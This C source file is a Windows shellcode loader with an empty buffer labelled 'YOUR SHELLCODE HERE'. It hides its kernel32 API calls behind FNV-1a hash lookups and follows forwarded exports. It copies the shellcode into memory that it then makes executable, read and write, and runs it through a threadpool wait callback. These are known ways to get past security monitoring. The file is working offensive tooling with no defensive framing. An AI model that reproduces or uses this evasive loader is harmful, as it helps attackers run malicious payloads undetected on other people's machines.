#include <stdio.h>
#include <stdint.h>
#include <Windows.h>
#include <string.h>
#include <threadpoolapiset.h>


static uint8_t buff[] = {

	// YOUR SHELLCODE HERE

};

// hashing function thanks Grok

uint64_t fnv1a_64(const char* string)
{
	uint64_t hash = 0xcbf29ce484222325ULL;
	const char* p = string;
	while (*p) {
		hash ^= (uint8_t)*p++;
		hash *= 0x100000001b3ULL;
	}
	return hash;
}

static DWORD _atoi(const char* s) {
	DWORD n = 0;
	while (*s >= '0' && *s <= '9') {
		n = n * 10 + (*s++ - '0');
	}
	return n;
}

FARPROC GetProcAddressByHash(HMODULE hModule, uint64_t targetHash)
{
	if (!hModule) return NULL;
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos->e_lfanew);

	DWORD exportRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	DWORD exportSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	if (!exportRVA) return NULL;
	PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportRVA);

	PDWORD names = (PDWORD)((BYTE*)hModule + exp->AddressOfNames);
	PDWORD functions = (PDWORD)((BYTE*)hModule + exp->AddressOfFunctions);
	PWORD  ordinals = (PWORD)((BYTE*)hModule + exp->AddressOfNameOrdinals);

	for (DWORD i = 0; i < exp->NumberOfNames; i++) {
		const char* name = (const char*)((BYTE*)hModule + names[i]);
		if (fnv1a_64(name) == targetHash) {
			DWORD funcRva = functions[ordinals[i]];
			if (funcRva >= exportRVA && funcRva < (exportRVA + exportSize)) {
				const char* forwarder = (const char*)((BYTE*)hModule + funcRva);

				const char* dot = forwarder;
				while (*dot && *dot != '.') dot++;
				if (*dot != '.') return NULL;

				char dllName[80];
				size_t dllLen = dot - forwarder;
				if (dllLen >= sizeof(dllName) - 5) dllLen = sizeof(dllName) - 5;
				for (size_t j = 0; j < dllLen; j++) dllName[j] = forwarder[j];
				dllName[dllLen] = '\0';

				const char* ext = ".dll";
				size_t k = dllLen;
				for (size_t j = 0; ext[j] && k < sizeof(dllName) - 1; j++)
					dllName[k++] = ext[j];
				dllName[k] = '\0';

				const char* targetName = dot + 1;
				HMODULE hForward = LoadLibraryA(dllName);
				if (!hForward) return NULL;

				if (targetName[0] == '#') {
					DWORD ordinal = _atoi(targetName + 1);

					PIMAGE_DOS_HEADER fwdDos = (PIMAGE_DOS_HEADER)hForward;
					PIMAGE_NT_HEADERS fwdNt = (PIMAGE_NT_HEADERS)((BYTE*)hForward + fwdDos->e_lfanew);
					DWORD fwdExportRVA = fwdNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
					if (!fwdExportRVA) return NULL;

					PIMAGE_EXPORT_DIRECTORY fwdExp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hForward + fwdExportRVA);
					PDWORD fwdFuncs = (PDWORD)((BYTE*)hForward + fwdExp->AddressOfFunctions);

					DWORD idx = ordinal - fwdExp->Base;
					if (idx >= fwdExp->NumberOfFunctions) return NULL;

					return (FARPROC)((BYTE*)hForward + fwdFuncs[idx]);
				}

				// Named forward: hash target name and recurse
				uint64_t forwardHash = fnv1a_64(targetName);
				return GetProcAddressByHash(hForward, forwardHash);
			}

			return (FARPROC)((BYTE*)hModule + funcRva);
		}
	}
	return NULL;
}

#define HASH_VirtualAlloc 0xfa55e32c9d72a921ULL
#define HASH_VirtualProtect 0xed1006223abbbd53ULL
#define HASH_CreateEventA 0xad3fe8bbfde758e2ULL
#define HASH_CreateThreadpoolWait 0x282752e7f944c1d6ULL
#define HASH_SetThreadpoolWait 0x9e8a739c2f491d04ULL
#define HASH_SetEvent 0xc45a14a65da7a571ULL
#define HASH_CloseThreadpoolWait 0xc97f6c4b0c705924ULL
#define HASH_CloseHandle 0x00556a045b10de85ULL



typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* pCreateEventA)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
typedef PTP_WAIT(WINAPI* pCreateThreadpoolWait)(PTP_WAIT_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);
typedef VOID(WINAPI* pSetThreadpoolWait)(PTP_WAIT, HANDLE, PFILETIME);
typedef BOOL(WINAPI* pSetEvent)(HANDLE);
typedef VOID(WINAPI* pCloseThreadpoolWait)(PTP_WAIT);
typedef BOOL(WINAPI* pCloseHandle)(HANDLE);

int main(void)
{
	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");

	pVirtualAlloc         VirtualAlloc_ = (pVirtualAlloc)GetProcAddressByHash(hKernel32, HASH_VirtualAlloc);
	pVirtualProtect       VirtualProtect_ = (pVirtualProtect)GetProcAddressByHash(hKernel32, HASH_VirtualProtect);
	pCreateEventA         CreateEventA_ = (pCreateEventA)GetProcAddressByHash(hKernel32, HASH_CreateEventA);
	pCreateThreadpoolWait CreateThreadpoolWait_ = (pCreateThreadpoolWait)GetProcAddressByHash(hKernel32, HASH_CreateThreadpoolWait);
	pSetThreadpoolWait    SetThreadpoolWait_ = (pSetThreadpoolWait)GetProcAddressByHash(hKernel32, HASH_SetThreadpoolWait);
	pSetEvent             SetEvent_ = (pSetEvent)GetProcAddressByHash(hKernel32, HASH_SetEvent);
	pCloseThreadpoolWait  CloseThreadpoolWait_ = (pCloseThreadpoolWait)GetProcAddressByHash(hKernel32, HASH_CloseThreadpoolWait);
	pCloseHandle          CloseHandle_ = (pCloseHandle)GetProcAddressByHash(hKernel32, HASH_CloseHandle);

	if (!VirtualAlloc_ || !VirtualProtect_ || !CreateEventA_ ||
		!CreateThreadpoolWait_ || !SetThreadpoolWait_ || !SetEvent_ ||
		!CloseThreadpoolWait_ || !CloseHandle_) {
		return -1;
	}

	LPVOID bufaddress = VirtualAlloc_(NULL, sizeof(buff), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!bufaddress) return -1;

	RtlMoveMemory(bufaddress, buff, sizeof(buff));

	DWORD old;
	VirtualProtect_(bufaddress, sizeof(buff), PAGE_EXECUTE_READWRITE, & old);

	HANDLE hTriggerEvent = CreateEventA_(NULL, FALSE, FALSE, NULL);

	PTP_WAIT threadPoolWait = CreateThreadpoolWait_((PTP_WAIT_CALLBACK)bufaddress, NULL, NULL);
	if (!threadPoolWait) return -1;


	SetThreadpoolWait_(threadPoolWait, hTriggerEvent, NULL);
	

	SetEvent_(hTriggerEvent);
	Sleep(20000);


	CloseThreadpoolWait_(threadPoolWait);
	CloseHandle_(hTriggerEvent);
	VirtualFree(bufaddress, 0, MEM_RELEASE);

	return 0;
}
